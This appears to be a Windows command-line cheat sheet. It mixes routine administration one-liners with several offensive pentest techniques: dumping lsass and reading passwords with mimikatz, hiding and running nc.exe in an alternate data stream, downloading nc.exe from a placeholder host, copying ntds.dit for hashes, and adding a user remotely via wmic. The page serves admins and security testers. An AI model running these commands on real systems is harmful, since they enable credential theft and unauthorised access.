<h3><a id="user-content-create-nw-share-called-apps-with-read-access--limit-to-10-conns" class="anchor" href="#create-nw-share-called-apps-with-read-access--limit-to-10-conns" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Create n/w share called <code>Apps</code>, with read access &amp; limit to 10 conns</h3>

<pre><code>C:\&gt; net share Apps=C:\Apps /G:everyone,READ /US:10
</code></pre>

<h3><a id="user-content-list-all-the-drives-under-my-computer-using-fsutil" class="anchor" href="#list-all-the-drives-under-my-computer-using-fsutil" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>List all the drives under My Computer using fsutil</h3>

<pre><code>C:\&gt; fsutil.exe fsinfo drives
</code></pre>

<h3><a id="user-content-troubleshoot-nw-packet-drops-with-router-statistics-using-pathping" class="anchor" href="#troubleshoot-nw-packet-drops-with-router-statistics-using-pathping" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Troubleshoot n/w packet drops with router statistics using pathping</h3>

<pre><code>C:\&gt; pathping -n http://www.google.com
</code></pre>

<h3><a id="user-content-list-unsigned-dlls-for-a-specific-process" class="anchor" href="#list-unsigned-dlls-for-a-specific-process" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>List unsigned dlls for a specific process.</h3>

<p><strong>For system wide list, remove the process name</strong></p>

<pre><code>C:\&gt; listdlls -u explorer.exe
</code></pre>

<h3><a id="user-content-obtain-a-list-of-windows-xp-computers-on-the-domain-using-ps" class="anchor" href="#obtain-a-list-of-windows-xp-computers-on-the-domain-using-ps" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Obtain a list of Windows XP computers on the domain using PS</h3>

<p><strong>Server2008</strong></p>

<pre><code>PS C:\&gt; Get-ADComputer -filter {OperatingSystem -like "*XP*"}
</code></pre>

<h3><a id="user-content-open-the-system-properties-window-with-the-advanced-tab-selected" class="anchor" href="#open-the-system-properties-window-with-the-advanced-tab-selected" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Open the System Properties window, with the <code>Advanced</code> tab selected</h3>

<p><strong>Change the number for different tabs</strong></p>

<pre><code>C:\&gt; control sysdm.cpl,,3
</code></pre>

<h3><a id="user-content-using-the-dir-command-to-find-alternate-data-streams" class="anchor" href="#using-the-dir-command-to-find-alternate-data-streams" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Using the <code>dir</code> command to find Alternate Data Streams</h3>

<pre><code>C:\&gt; dir /R | find ":$D"
</code></pre>

<p>Using streams <code>sysinternals</code> (shows path):</p>

<pre><code>C:\&gt; streams -s .
</code></pre>

<h3><a id="user-content-use-procdump-to-obtain-the-lsass-process-memory" class="anchor" href="#use-procdump-to-obtain-the-lsass-process-memory" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Use <code>procdump</code> to obtain the <code>lsass</code> process memory.</h3>

<p><strong>Use <code>mimikatz</code> <code>minidump</code> to get passwords</strong></p>

<pre><code>C:\&gt; procdump -accepteula -ma lsass.exe mini.dmp
</code></pre>

<h3><a id="user-content-run-mimikatz-in-minidump-mode--use-minidmp-from-procdump" class="anchor" href="#run-mimikatz-in-minidump-mode--use-minidmp-from-procdump" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Run <code>mimikatz</code> in <code>minidump</code> mode &amp; use <code>mini.dmp</code> from <code>procdump</code></h3>

<pre><code>mimikatz # sekurlsa::minidump mini.dmp
mimikatz # sekurlsa::logonPasswords
</code></pre>

<h3><a id="user-content-get-list-of-startup-programs-using-wmic" class="anchor" href="#get-list-of-startup-programs-using-wmic" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get list of startup programs using wmic</h3>

<pre><code>C:\&gt; wmic startup list full
</code></pre>

<h3><a id="user-content-add-a-binary-to-an-alternate-data-stream" class="anchor" href="#add-a-binary-to-an-alternate-data-stream" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Add a binary to an Alternate Data Stream</h3>

<pre><code>C:\&gt; type c:\tools\nc.exe &gt; c:\nice.png:nc.exe
</code></pre>

<p>Execute it (XP/2K3):</p>

<pre><code>C:\&gt; start c:\nice.png:nc.exe
</code></pre>

<h3><a id="user-content-execute-a-binary-alternate-data-stream-win-72008-using-wmic" class="anchor" href="#execute-a-binary-alternate-data-stream-win-72008-using-wmic" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Execute a binary Alternate Data Stream Win 7/2008 using wmic</h3>

<pre><code>C:\&gt; wmic process call create C:\nice.png:nc.exe
</code></pre>

<h3><a id="user-content-show-config--state-info-for-network-access-protection-enabled-client" class="anchor" href="#show-config--state-info-for-network-access-protection-enabled-client" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Show config &amp; state info for Network Access Protection enabled client</h3>

<p><a href="https://technet.microsoft.com/en-us/library/cc730902(v=ws.10).aspx">https://technet.microsoft.com/en-us/library/cc730902(v=ws.10).aspx</a></p>

<pre><code>C:\&gt; netsh nap client show configuration
</code></pre>

<h3><a id="user-content-get-computer-system-information-including-domain-name-and-memory-using-wmic" class="anchor" href="#get-computer-system-information-including-domain-name-and-memory-using-wmic" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get computer system information, including domain name and memory, using wmic</h3>

<pre><code>C:\&gt; wmic computersystem list /format:csv
</code></pre>

<h3><a id="user-content-use-the-package-manager-in-windows-to-install-the-telnet-client-on-windows-vista--higher" class="anchor" href="#use-the-package-manager-in-windows-to-install-the-telnet-client-on-windows-vista--higher" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Use the Package Manager in Windows to install the Telnet client on Windows Vista &amp; higher</h3>

<pre><code>C:\&gt; pkgmgr /iu:"TelnetClient"
</code></pre>

<h3><a id="user-content-secure-delete-a-filefolder-in-windows" class="anchor" href="#secure-delete-a-filefolder-in-windows" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Secure delete a file/folder in Windows</h3>

<p><strong>Sysinternals</strong></p>

<pre><code>C:\&gt; sdelete -p 10 a.txt
</code></pre>

<p>To recursively delete folders:</p>

<pre><code>C:\&gt; sdelete -10 -r C:\data\
</code></pre>

<h3><a id="user-content-show-all-startup-entries-while-hiding-microsoft-entries-csv-output" class="anchor" href="#show-all-startup-entries-while-hiding-microsoft-entries-csv-output" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Show all startup entries while hiding Microsoft entries. CSV output</h3>

<p><strong>It covers more locations than Windows inbuilt tools</strong></p>

<pre><code>C:\&gt; autorunsc -m -c
</code></pre>

<h3><a id="user-content-download-files-via-commandline-using-ps" class="anchor" href="#download-files-via-commandline-using-ps" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Download files via commandline using PS</h3>

<pre><code>PS C:\&gt; ipmo BitsTransfer;Start-BitsTransfer -Source http://foo/nc.exe -Destination C:\Windows\Temp\
</code></pre>

<h3><a id="user-content-fetch-the-last-10-entries-from-the-windows-security-event-log-in-text-format" class="anchor" href="#fetch-the-last-10-entries-from-the-windows-security-event-log-in-text-format" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Fetch the last 10 entries from the Windows Security event log, in text format</h3>

<pre><code>C:\&gt; wevtutil qe Security /c:10 /f:Text
</code></pre>

<p><strong>def is XML</strong></p>

<h3><a id="user-content-create-a-dll-that-runs-calc-on-invoke" class="anchor" href="#create-a-dll-that-runs-calc-on-invoke" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Create a dll that runs calc on invoke</h3>

<pre><code>msfpayload windows/exec cmd=calc.exe R | msfencode -t dll -o rcalc.dll

C:\&gt; rundll32.exe rcalc.dll,1
</code></pre>

<h3><a id="user-content-run-a-command-as-another-user" class="anchor" href="#run-a-command-as-another-user" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Run a command as another user</h3>

<p><strong>You will be prompted for password</strong></p>

<pre><code>C:\&gt; runas /noprofile /user:domain\username "mmc wf.msc"
</code></pre>

<h3><a id="user-content-get-shutdownreboot-events-from-the-last-1000-log-entries-using-ps" class="anchor" href="#get-shutdownreboot-events-from-the-last-1000-log-entries-using-ps" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get shutdown/reboot events from the last 1000 log entries using PS</h3>

<pre><code>Get-EventLog -log system -n 1000 | Where {$_.eventid -eq '1074'} | fl -pr *
</code></pre>

<h3><a id="user-content-create-a-new-snapshot-of-the-volume-that-has-the-ad-database-and-log-files" class="anchor" href="#create-a-new-snapshot-of-the-volume-that-has-the-ad-database-and-log-files" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Create a new snapshot of the volume that has the AD database and log files</h3>

<pre><code>C:\&gt; ntdsutil sn "ac i ntds" create quit quit
</code></pre>

<h3><a id="user-content-mount-the-snapshot" class="anchor" href="#mount-the-snapshot" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Mount the snapshot</h3>

<p><strong>Copy ntds.dit from snapshot &amp; System hive from reg for pwd hashes</strong></p>

<pre><code>C:\&gt; ntdsutil snapshot "list all" "mount 1" quit quit
</code></pre>

<h3><a id="user-content-run-a-process-on-a-remote-system-using-wmic" class="anchor" href="#run-a-process-on-a-remote-system-using-wmic" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Run a process on a remote system using wmic</h3>

<pre><code>C:\&gt; wmic /node:ip process call create "net user dum dum /add"
</code></pre>

<h3><a id="user-content-list-the-machines-with-usernames-that-were-connected-via-rdp" class="anchor" href="#list-the-machines-with-usernames-that-were-connected-via-rdp" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>List the machines, with usernames, that were connected via RDP</h3>

<pre><code>C:\&gt; reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s
</code></pre>

<h3><a id="user-content-list-all-process-that-are-running-on-your-system-by-remote-users-connected-via-rdp" class="anchor" href="#list-all-process-that-are-running-on-your-system-by-remote-users-connected-via-rdp" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>List all process that are running on your system by remote users connected via RDP</h3>

<pre><code>C:\&gt; query process *
</code></pre>

<h3><a id="user-content-reset-the-windows-tcpip-stack" class="anchor" href="#reset-the-windows-tcpip-stack" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Reset the Windows TCP\IP stack</h3>

<pre><code>netsh int ip reset c:\tcpresetlog.txt
</code></pre>

<h3><a id="user-content-list-logged-on-users" class="anchor" href="#list-logged-on-users" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>List logged on users.</h3>

<p><strong>Very useful during a pentest to look for domain admins</strong></p>

<pre><code>C:\&gt; net session | find "\\"
</code></pre>

